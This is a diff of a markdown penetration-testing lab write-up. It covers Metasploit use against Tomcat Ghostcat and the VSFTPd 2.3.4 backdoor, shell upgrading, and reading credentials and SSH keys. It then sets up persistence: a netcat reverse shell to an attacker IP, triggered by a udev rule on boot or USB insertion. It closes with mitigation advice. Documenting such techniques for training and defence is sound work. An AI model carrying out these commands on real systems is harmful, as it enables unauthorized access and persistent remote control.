@@ -47,18 +47,41 @@ The Basic Network Scan goes further. It uses more probes, active plugins, OS fin
 
 ## Using Metasploit
 
+### Apache Tomcat AJP Vuln
+
 We get our hands on a lot of critical vulnerabilities, an interesting one could be a vuln with Apache Tomcat AJP (AJP is used for request forwarding, it can allow attackers to access local app resources due to bad trust assumptions).
 
 We'll use the msf tomcat_ghostcat plugin
-We set RHOSTS and RPORT, FILENAME
-And we get access to the file, which would normally be unreadable unless privileged
+We set RHOSTS, RPORT, and FILENAME, then gain access to the file, which would typically be unreadable without elevated privileges.
 
-Now, leveraging the VSFTPd 2.3.4 backdoor
+### VSFTPd 2.3.4 backdoor
+
+Next, we'll leverage the VSFTPd 2.3.4 backdoor
 We use the Metasploit unix/ftp/vsftpd_234_backdoor
-This gives us a shell, which we can make more interactive using: `python -c 'import pty; pty.spawn("/bin/bash")'`
+We run the Metasploit unix/ftp/vsftpd_234_backdoor module.
+This gives us a shell, which we can make interactive with: `python -c 'import pty; pty.spawn("/bin/bash")'`
 
-Having an interactive shell enables su command usage, so that we can impersonate any user.
-From here, we can enumerate the users with the `/etc/passwd` file, check for services configurations, look for private ssh keys...
+With an interactive shell, we can now use the su command to impersonate any user.
+From here, we can enumerate the users by reading the /etc/passwd file, check for service configurations, and look for private SSH keys...
 
 ### Establishing persistence
 
+To establish persistence, we’ll use udev.
+By default, udev cannot start reverse shells, so we need to detach the script from its execution, maybe using `at`
+For this, we check if at is installed first:
+`which at`
+Once confirmed, we create the script that will initiate the reverse shell: 'nc -c sh 192.168.64.5 45466' > /opt/scripts/rshell.sh`
+Then: `echo 'SUBSYSTEMS=="usb", RUN+="/usr/bin/at -M -f /opt/scripts/rshell.sh now"' > /etc/udev/rules.d/ttp.rules`
+
+Now, at every boot, or everytime an usb device is plugged-in, the reverse shell will initiate towards our attacking host.
+To setup the listener: `nc -lvnp 45466`
+
+## Mitigating, Security by Default, Monitoring...
+
+Regularly update software and services. Vulnerabilities get patched frequently, and staying updated reduces the attack surface.
+Prevent system bloat with too much different services and open ports, keep things simple. 
+Regularly audit network infrastructure itself, topology, permissions, authentication flaws...
+
+Monitor systems: SIEM tools like Wazuh help monitor system logs, detect suspicious activity, and alert about threats.
+Use an XDR for proactive defense.
+Monitor security sources, news: CSIRT, CERT-FR and threat intelligence providers.
